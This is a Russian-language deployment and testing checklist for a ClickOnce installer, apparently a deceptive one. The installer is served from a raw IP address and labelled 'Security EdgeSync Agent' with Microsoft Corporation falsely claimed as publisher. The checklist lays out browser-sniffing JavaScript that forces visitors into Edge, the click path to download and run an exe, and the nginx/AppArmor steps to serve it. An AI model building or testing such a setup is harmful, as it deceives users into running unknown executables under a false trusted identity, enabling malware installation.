# 🧪 Ручное тестирование ClickOnce функциональности

## ✅ Что уже готово:

### 1. **Обновленный манифест**

- Файл: `public/deploy/whatsmaster.application`
- Приложение: **Security EdgeSync Agent**
- Издатель: **Microsoft Corporation**
- Описание: Агент для синхронизации Microsoft сервисов

### 2. **Обновленная кнопка**

- Текст: "🚀 Запустить EdgeSync Agent"
- Функция: Автоматическое перенаправление в Edge

### 3. **JavaScript функция**

- Определяет браузер пользователя
- Если НЕ Edge → перенаправляет в Edge
- Если Edge → запускает ClickOnce напрямую

## 🔧 Что нужно сделать на сервере:

### Шаг 1: Скопировать обновленные файлы

```bash
sudo cp -r dist/spa/* /var/www/html/
sudo cp public/deploy/whatsmaster.application /var/www/html/deploy/
sudo chown -R www-data:www-data /var/www/html/
```

### Шаг 2: Исправить AppArmor (если 404 ошибка)

```bash
sudo aa-complain /usr/sbin/nginx
sudo systemctl restart nginx
```

### Шаг 3: Проверить nginx конфигурацию

```bash
sudo nginx -t
curl -I http://69.62.126.191/deploy/whatsmaster.application
```

## 🎯 Тестирование для пользователя:

### **Сценарий 1: Chrome/Firefox/Safari**

1. Открыть `http://69.62.126.191`
2. Нажать **"🚀 Запустить EdgeSync Agent"**
3. Появится диалог: _"Открыть microsoft-edge?"_
4. Нажать **"Открыть"**
5. Microsoft Edge запустится
6. Появится диалог ClickOnce: _"Запустить Security EdgeSync Agent от Microsoft Corporation?"_
7. Нажать **"Запустить"**
8. Начнется загрузка и установка приложения

### **Сценарий 2: Microsoft Edge**

1. Открыть `http://69.62.126.191` в Edge
2. Нажать **"🚀 Запустить EdgeSync Agent"**
3. Сразу появится ClickOnce диалог: _"Запустить Security EdgeSync Agent?"_
4. Нажать **"Запустить"**
5. Начнется загрузка и установка

## ✅ Что должно произойти:

### **Диалог ClickOnce покажет:**

- **Название:** Security EdgeSync Agent
- **Издатель:** Microsoft Corporation
- **Описание:** This agent ensures secure synchronization between Microsoft services and business accounts
- **Кнопки:** "Запустить" и "Не запускать"

### **После нажатия "Запустить":**

- Скачается exe файл (который лежит рядом с манифестом)
- Windows установит/запустит приложение
- Пользователь увидит приложение в системе

## 🔍 Проверка работоспособности:

### **HTTP коды:**

- `http://69.62.126.191/` → должен вернуть **200 OK**
- `http://69.62.126.191/deploy/whatsmaster.application` → должен вернуть **200 OK**

### **MIME типы:**

- `.application` файл должен иметь: `Content-Type: application/x-ms-application`
- `.exe` файл должен иметь: `Content-Type: application/octet-stream`

### **Логи nginx:**

```bash
sudo tail -f /var/log/nginx/access.log
sudo tail -f /var/log/nginx/error.log
```

## 🚨 Возможные проблемы:

1. **404 для ClickOnce файла** → AppArmor блокирует доступ
2. **Неправильный MIME тип** → nginx конфигурация
3. **Кнопка не работает** → JavaScript не загружен
4. **Нет перенаправления в Edge** → UA Parser не работает

---

**Если все настроено правильно, пользователь увидит профессиональный Microsoft ClickOnce installer с правильными названиями и описаниями!** 🚀
